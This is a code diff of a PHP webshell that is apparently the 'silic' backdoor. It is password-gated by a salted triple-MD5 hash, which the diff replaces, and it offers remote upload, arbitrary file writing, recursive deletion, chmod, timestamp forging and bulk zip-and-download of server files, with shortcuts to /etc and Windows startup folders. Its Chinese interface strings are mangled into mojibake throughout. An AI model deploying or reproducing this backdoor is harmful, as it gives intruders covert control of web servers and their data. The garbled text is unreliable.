@@ -9,14 +9,14 @@ function Root_GP(&$array)
 		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
 		{
 			if(is_string($var)) $array[$key] = stripslashes($var);
-			if(is_array($var)) $array[$key] = Root_GP($var);  
+			if(is_array($var)) $array[$key] = Root_GP($var);
 		}
 	}
 	return $array;
 }
 $salt = "silic1234";
 $psw = trim($_POST['silicpass']);
-$password="c40c9ca787d5bb798d3712bf73d24f0b";
+$password = "9c3a9720372fdfac053882f578e65846";
 $passt = $salt.$psw;
 $passt = md5(md5(md5($passt)));
 $asse='asert';
@@ -25,10 +25,10 @@ function Root_CSS()
 print<<<END
 <style type="text/css">
 *{padding:0; margin:0;}
-body{background:threedface;font-family:"Verdana","Tahoma","ËÎÌå",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
+body{background:threedface;font-family:"Verdana","Tahoma","ï¿½ï¿½ï¿½ï¿½",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
 a{color:#000000;text-decoration:none;}
 a:hover{background:#BBBBBB;}
-table{color:#000000;font-family:"Verdana","Tahoma","ËÎÌå",sans-serif;font-size:13px;border:1px solid #999999;}
+table{color:#000000;font-family:"Verdana","Tahoma","ï¿½ï¿½ï¿½ï¿½",sans-serif;font-size:13px;border:1px solid #999999;}
 td{background:#F9F6F4;}
 .toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}
 .msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
@@ -38,7 +38,7 @@ td{background:#F9F6F4;}
 END;
 return false;
 }
-//ÎÄ¼þ¹ÜÀí
+//ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 class packdir
 {
 	var $out='';
@@ -75,7 +75,7 @@ function at($atunix = 0)
 		$unixarr['hours']   = 0;
 		$unixarr['minutes'] = 0;
 		$unixarr['seconds'] = 0;
-	} 
+	}
 	return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
 }
 function filezip($data, $name, $time = 0)
@@ -191,25 +191,25 @@ function File_Down($filename)
 }
 function File_Deltree($deldir)
 {
-	if(($mydir = @opendir($deldir)) == NULL) return false;	
+	if(($mydir = @opendir($deldir)) == NULL) return false;
 	while(false !== ($file = @readdir($mydir)))
 	{
 		$name = File_Str($deldir.'/'.$file);
 		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}
 		if(is_file($name)){@chmod($name,0777);@unlink($name);}
-	} 
+	}
 	@closedir($mydir);
 	@chmod($deldir,0777);
 	return @rmdir($deldir) ? true : false;
 }
 function File_Act($array,$actall,$inver)
 {
-	if(($count = count($array)) == 0) return 'ÇëÑ¡ÔñÎÄ¼þ';
+	if(($count = count($array)) == 0) return 'ï¿½ï¿½Ñ¡ï¿½ï¿½ï¿½Ä¼ï¿½';
 	if($actall == 'e')
 	{
 		$zip = new packdir;
 		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
-		return '´ò°üÎÄ¼þÊ§°Ü';
+		return 'ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½';
 	}
 	$i = 0;
 	while($i < $count)
@@ -217,14 +217,14 @@ function File_Act($array,$actall,$inver)
 		$array[$i] = urldecode($array[$i]);
 		switch($actall)
 		{
-			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return 'Â·¾¶´íÎó'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '¸´ÖÆµ½'.$inver.'Ä¿Â¼'; break;
-			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'É¾³ý'; break;
-			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'ÊôÐÔÖµ´íÎó'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = 'ÊôÐÔÐÞ¸ÄÎª'.$inver; break;
-			case "d" : @touch($array[$i],strtotime($inver)); $msg = 'ÐÞ¸ÄÊ±¼äÎª'.$inver; break;
+			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return 'Â·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = 'ï¿½ï¿½ï¿½Æµï¿½'.$inver.'Ä¿Â¼'; break;
+			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'É¾ï¿½ï¿½'; break;
+			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ï¿½ï¿½'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = 'ï¿½ï¿½ï¿½ï¿½ï¿½Þ¸ï¿½Îª'.$inver; break;
+			case "d" : @touch($array[$i],strtotime($inver)); $msg = 'ï¿½Þ¸ï¿½Ê±ï¿½ï¿½Îª'.$inver; break;
 		}
 		$i++;
 	}
-	return 'ËùÑ¡ÎÄ¼þ'.$msg.'Íê±Ï';
+	return 'ï¿½ï¿½Ñ¡ï¿½Ä¼ï¿½'.$msg.'ï¿½ï¿½ï¿½ï¿½';
 }
 function File_Edit($filepath,$filename,$dim = '')
 {
@@ -258,20 +258,20 @@ function search(str){
 }
 function CheckDate(){
 	var re = document.getElementById('mtime').value;
-	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
+	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/;
 	var r = re.match(reg);
-	if(r==null){alert('ÈÕÆÚ¸ñÊ½²»ÕýÈ·!¸ñÊ½:yyyy-mm-dd hh:mm:ss');return false;}
+	if(r==null){alert('ï¿½ï¿½ï¿½Ú¸ï¿½Ê½ï¿½ï¿½ï¿½ï¿½È·!ï¿½ï¿½Ê½:yyyy-mm-dd hh:mm:ss');return false;}
 	else{document.getElementById('editor').submit();}
 }
 </script>
-<div class="actall">²éÕÒÄÚÈÝ: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
-<input type="button" value="²éÕÒ" onclick="search(searchs.value)"></div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
+<input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="search(searchs.value)"></div>
 <form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
 <div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
 <div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
-<div class="actall">ÎÄ¼þÐÞ¸ÄÊ±¼ä <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
-<div class="actall"><input type="button" value="±£´æ" onclick="CheckDate();" style="width:80px;">
-<input type="button" value="·µ»Ø" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
+<div class="actall">ï¿½Ä¼ï¿½ï¿½Þ¸ï¿½Ê±ï¿½ï¿½ <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
+<div class="actall"><input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="CheckDate();" style="width:80px;">
+<input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
 </form>
 END;
 }
@@ -279,7 +279,7 @@ function File_Soup($p)
 {
 	$THIS_DIR = urlencode($p);
 	$UP_SIZE = get_cfg_var('upload_max_filesize');
-	$MSG_BOX = 'µ¥¸ö¸½¼þÔÊÐí´óÐ¡:'.$UP_SIZE.', ¸ÄÃû¸ñÊ½(new.php),ÈçÎª¿Õ,Ôò±£³ÖÔ­ÎÄ¼þÃû.';
+	$MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð¡:'.$UP_SIZE.', ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê½(new.php),ï¿½ï¿½Îªï¿½ï¿½,ï¿½ò±£³ï¿½Ô­ï¿½Ä¼ï¿½ï¿½ï¿½.';
 	if(!empty($_POST['updir']))
 	{
 		if(count($_FILES['soup']) >= 1)
@@ -291,36 +291,36 @@ function File_Soup($p)
 				{
 					$souptmp = $_FILES['soup']['tmp_name'][$key];
 					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
-					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'ÉÏ´«³É¹¦' : $soupname.'ÉÏ´«Ê§°Ü';
+					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'ï¿½Ï´ï¿½ï¿½É¹ï¿½' : $soupname.'ï¿½Ï´ï¿½Ê§ï¿½ï¿½';
 				}
 				$i++;
 			}
 		}
 		else
 		{
-			$MSG_BOX = 'ÇëÑ¡ÔñÎÄ¼þ';
+			$MSG_BOX = 'ï¿½ï¿½Ñ¡ï¿½ï¿½ï¿½Ä¼ï¿½';
 		}
 	}
 print<<<END
 <div class="msgbox">{$MSG_BOX}</div>
 <form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
-<div class="actall">ÉÏ´«µ½Ä¿Â¼: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
-<div class="actall">¸½¼þ1 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
-<div class="actall">¸½¼þ2 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
-<div class="actall">¸½¼þ3 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
-<div class="actall">¸½¼þ4 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
-<div class="actall">¸½¼þ5 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
-<div class="actall">¸½¼þ6 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
-<div class="actall">¸½¼þ7 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
-<div class="actall">¸½¼þ8 <input type="file" name="soup[]" style="width:300px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
-<div class="actall"><input type="submit" value="ÉÏ´«" style="width:80px;"> <input type="button" value="·µ»Ø" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
+<div class="actall">ï¿½Ï´ï¿½ï¿½ï¿½Ä¿Â¼: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½1 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½2 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½3 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½4 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½5 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½6 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½7 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
+<div class="actall">ï¿½ï¿½ï¿½ï¿½8 <input type="file" name="soup[]" style="width:300px;height:22px;"> ï¿½ï¿½ï¿½ï¿½ <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
+<div class="actall"><input type="submit" value="ï¿½Ï´ï¿½" style="width:80px;"> <input type="button" value="ï¿½ï¿½ï¿½ï¿½" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
 </form>
 END;
 }
 function File_a($p)
 {
 	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
-	$MSG_BOX = 'µÈ´ýÏûÏ¢¶ÓÁÐ';
+	$MSG_BOX = 'ï¿½È´ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½';
 	$UP_DIR = urlencode(File_Str($p.'/..'));
 	$REAL_DIR = File_Str(realpath($p));
 	$FILE_DIR = File_Str(dirname(__FILE__));
@@ -328,20 +328,20 @@ function File_a($p)
 	$THIS_DIR = urlencode(File_Str($REAL_DIR));
 	$NUM_D = 0;
 	$NUM_F = 0;
-	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '±à¼­ÎÄ¼þ '.$_POST['pfn'].' ³É¹¦' : '±à¼­ÎÄ¼þ '.$_POST['pfn'].' Ê§°Ü';@touch($_POST['pfn'],$intime);}
-	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? 'ÉÏ´«ÎÄ¼þ '.$upfilename.' ³É¹¦' : 'ÉÏ´«ÎÄ¼þ '.$upfilename.' Ê§°Ü';}
+	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? 'ï¿½à¼­ï¿½Ä¼ï¿½ '.$_POST['pfn'].' ï¿½É¹ï¿½' : 'ï¿½à¼­ï¿½Ä¼ï¿½ '.$_POST['pfn'].' Ê§ï¿½ï¿½';@touch($_POST['pfn'],$intime);}
+	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? 'ï¿½Ï´ï¿½ï¿½Ä¼ï¿½ '.$upfilename.' ï¿½É¹ï¿½' : 'ï¿½Ï´ï¿½ï¿½Ä¼ï¿½ '.$upfilename.' Ê§ï¿½ï¿½';}
 	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
-	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = 'ÊôÐÔÖµ´íÎó'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? 'ÐÞ¸Ä '.$modfile.' ÊôÐÔÎª '.$_GET['md'].' ³É¹¦' : 'ÐÞ¸Ä '.$modfile.' ÊôÐÔÎª '.$_GET['md'].' Ê§°Ü';}
-	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '¸ÄÃû '.$_GET['mn'].' Îª '.$_GET['rn'].' ³É¹¦' : '¸ÄÃû '.$_GET['mn'].' Îª '.$_GET['rn'].' Ê§°Ü';}
-	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '´´½¨Ä¿Â¼ '.$_GET['dn'].' ³É¹¦' : '´´½¨Ä¿Â¼ '.$_GET['dn'].' Ê§°Ü';}
-	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'É¾³ýÄ¿Â¼ '.$_GET['dd'].' ³É¹¦' : 'É¾³ýÄ¿Â¼ '.$_GET['dd'].' Ê§°Ü';}
-	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'ÏÂÔØÎÄ¼þ²»´æÔÚ';}
+	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ï¿½ï¿½'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? 'ï¿½Þ¸ï¿½ '.$modfile.' ï¿½ï¿½ï¿½ï¿½Îª '.$_GET['md'].' ï¿½É¹ï¿½' : 'ï¿½Þ¸ï¿½ '.$modfile.' ï¿½ï¿½ï¿½ï¿½Îª '.$_GET['md'].' Ê§ï¿½ï¿½';}
+	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? 'ï¿½ï¿½ï¿½ï¿½ '.$_GET['mn'].' Îª '.$_GET['rn'].' ï¿½É¹ï¿½' : 'ï¿½ï¿½ï¿½ï¿½ '.$_GET['mn'].' Îª '.$_GET['rn'].' Ê§ï¿½ï¿½';}
+	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? 'ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ '.$_GET['dn'].' ï¿½É¹ï¿½' : 'ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ '.$_GET['dn'].' Ê§ï¿½ï¿½';}
+	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'É¾ï¿½ï¿½Ä¿Â¼ '.$_GET['dd'].' ï¿½É¹ï¿½' : 'É¾ï¿½ï¿½Ä¿Â¼ '.$_GET['dd'].' Ê§ï¿½ï¿½';}
+	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½';}
 	Root_CSS();
 print<<<END
 <script type="text/javascript">
 	function Inputok(msg,gourl)
 	{
-		smsg = "µ±Ç°ÎÄ¼þ:[" + msg + "]";
+		smsg = "ï¿½ï¿½Ç°ï¿½Ä¼ï¿½:[" + msg + "]";
 		re = prompt(smsg,unescape(msg));
 		if(re)
 		{
@@ -351,7 +351,7 @@ print<<<END
 	}
 	function Delok(msg,gourl)
 	{
-		smsg = "È·¶¨ÒªÉ¾³ý[" + unescape(msg) + "]Âð?";
+		smsg = "È·ï¿½ï¿½ÒªÉ¾ï¿½ï¿½[" + unescape(msg) + "]ï¿½ï¿½?";
 		if(confirm(smsg))
 		{
 			if(gourl == 'b')
@@ -364,14 +364,14 @@ print<<<END
 	}
 	function CheckDate(msg,gourl)
 	{
-		smsg = "µ±Ç°ÎÄ¼þÊ±¼ä:[" + msg + "]";
+		smsg = "ï¿½ï¿½Ç°ï¿½Ä¼ï¿½Ê±ï¿½ï¿½:[" + msg + "]";
 		re = prompt(smsg,msg);
 		if(re)
 		{
 			var url = gourl + re;
-			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
+			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/;
 			var r = re.match(reg);
-			if(r==null){alert('ÈÕÆÚ¸ñÊ½²»ÕýÈ·!¸ñÊ½:yyyy-mm-dd hh:mm:ss');return false;}
+			if(r==null){alert('ï¿½ï¿½ï¿½Ú¸ï¿½Ê½ï¿½ï¿½ï¿½ï¿½È·!ï¿½ï¿½Ê½:yyyy-mm-dd hh:mm:ss');return false;}
 			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
 		}
 	}
@@ -400,34 +400,34 @@ print<<<END
 <form method="GET"><input type="hidden" id="s" name="s" value="a">
 <input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
 <select onchange="location.href='?s=a&p='+options[selectedIndex].value">
-	<option>---ÌØÊâÄ¿Â¼---</option>
-	<option value="{$ROOT_DIR}">ÍøÕ¾¸ùÄ¿Â¼</option>
-	<option value="{$FILE_DIR}">±¾³ÌÐòÄ¿Â¼</option>
-	<option value="C:/">CÅÌ</option>
-	<option value="D:/">DÅÌ</option>
-	<option value="E:/">EÅÌ</option>
-	<option value="F:/">FÅÌ</option>
-	<option value="C:/Documents and Settings/All Users/¡¸¿ªÊ¼¡¹²Ëµ¥/³ÌÐò/Æô¶¯">Æô¶¯Ïî</option>
-	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">Æô¶¯Ïî(Ó¢)</option>
-	<option value="C:/RECYCLER">»ØÊÕÕ¾</option>
+	<option>---ï¿½ï¿½ï¿½ï¿½Ä¿Â¼---</option>
+	<option value="{$ROOT_DIR}">ï¿½ï¿½Õ¾ï¿½ï¿½Ä¿Â¼</option>
+	<option value="{$FILE_DIR}">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼</option>
+	<option value="C:/">Cï¿½ï¿½</option>
+	<option value="D:/">Dï¿½ï¿½</option>
+	<option value="E:/">Eï¿½ï¿½</option>
+	<option value="F:/">Fï¿½ï¿½</option>
+	<option value="C:/Documents and Settings/All Users/ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½Ëµï¿½/ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½ï¿½">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
+	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(Ó¢)</option>
+	<option value="C:/RECYCLER">ï¿½ï¿½ï¿½ï¿½Õ¾</option>
 	<option value="C:/Program Files">Programs</option>
 	<option value="/etc">etc</option>
 	<option value="/home">home</option>
 	<option value="/usr/local">Local</option>
 	<option value="/tmp">Temp</option>
-</select><input type="submit" value="×ªµ½" style="width:50px;"></form>
+</select><input type="submit" value="×ªï¿½ï¿½" style="width:50px;"></form>
 <div style="margin-top:3px;"></div>
 <form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
-	<input type="button" value="ÐÂ½¨ÎÄ¼þ" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
-	<input type="button" value="ÐÂ½¨Ä¿Â¼" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
-	<input type="button" value="ÅúÁ¿ÉÏ´«" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
+	<input type="button" value="ï¿½Â½ï¿½ï¿½Ä¼ï¿½" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
+	<input type="button" value="ï¿½Â½ï¿½Ä¿Â¼" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');">
+	<input type="button" value="ï¿½ï¿½ï¿½ï¿½ï¿½Ï´ï¿½" onclick="window.location='?s=q&p={$REAL_DIR}';">
 	<input type="file" name="ufp" style="width:300px;height:22px;">
 	<input type="text" name="ufn" style="width:121px;height:22px;">
-	<input type="submit" value="ÉÏ´«" style="width:50px;">
+	<input type="submit" value="ï¿½Ï´ï¿½" style="width:50px;">
 </form></div>
 <form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
-<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ÉÏ¼¶Ä¿Â¼</b></a></td>
-<td class="toptd" style="width:80px;"> ²Ù×÷ </td><td class="toptd" style="width:48px;"> ÊôÐÔ </td><td class="toptd" style="width:173px;"> ÐÞ¸ÄÊ±¼ä </td><td class="toptd" style="width:75px;"> ´óÐ¡ </td></tr>
+<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ï¿½Ï¼ï¿½Ä¿Â¼</b></a></td>
+<td class="toptd" style="width:80px;"> ï¿½ï¿½ï¿½ï¿½ </td><td class="toptd" style="width:48px;"> ï¿½ï¿½ï¿½ï¿½ </td><td class="toptd" style="width:173px;"> ï¿½Þ¸ï¿½Ê±ï¿½ï¿½ </td><td class="toptd" style="width:75px;"> ï¿½ï¿½Ð¡ </td></tr>
 END;
 	if(($h_d = @opendir($p)) == NULL) return false;
 	while(false !== ($Filename = @readdir($h_d)))
@@ -441,8 +441,8 @@ END;
 			$Filepath = urlencode($Filepath);
 			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
 			$Filename = urlencode($Filename);
-			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> É¾³ý </a> ';
-			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> ¸ÄÃû </a> </td> ';
+			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> É¾ï¿½ï¿½ </a> ';
+			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> ï¿½ï¿½ï¿½ï¿½ </a> </td> ';
 			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
 			echo ' <td>'.$Filetime.'</td> ';
 			echo ' <td> </td> </tr>'."\r\n";
@@ -464,8 +464,8 @@ END;
 			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
 			$Filepath = urlencode($Filepath);
 			$Filename = urlencode($Filename);
-			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> ±à¼­ </a> ';
-			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> ¸ÄÃû </a> </td>';
+			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> ï¿½à¼­ </a> ';
+			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> ï¿½ï¿½ï¿½ï¿½ </a> </td>';
 			echo ' <td>'.$Fileperm.'</td> ';
 			echo ' <td>'.$Filetime.'</td> ';
 			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
@@ -476,19 +476,19 @@ END;
 	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
 print<<<END
 </table>
-<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
-<input type="hidden" id="inver" name="inver" value="undefined"> 
-<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
-<input type="button" value="¸´ÖÆ" onclick="SubmitUrl('¸´ÖÆËùÑ¡ÎÄ¼þµ½Â·¾¶: ','{$THIS_DIR}','a');return false;"> 
-<input type="button" value="É¾³ý" onclick="Delok('ËùÑ¡ÎÄ¼þ','b');return false;"> 
-<input type="button" value="ÊôÐÔ" onclick="SubmitUrl('ÐÞ¸ÄËùÑ¡ÎÄ¼þÊôÐÔÖµÎª: ','0666','c');return false;"> 
-<input type="button" value="Ê±¼ä" onclick="CheckDate('{$Filetime}','d');return false;"> 
-<input type="button" value="´ò°ü" onclick="SubmitUrl('´ò°ü²¢ÏÂÔØËùÑ¡ÎÄ¼þÏÂÔØÃûÎª: ','silic.gz','e');return false;"> 
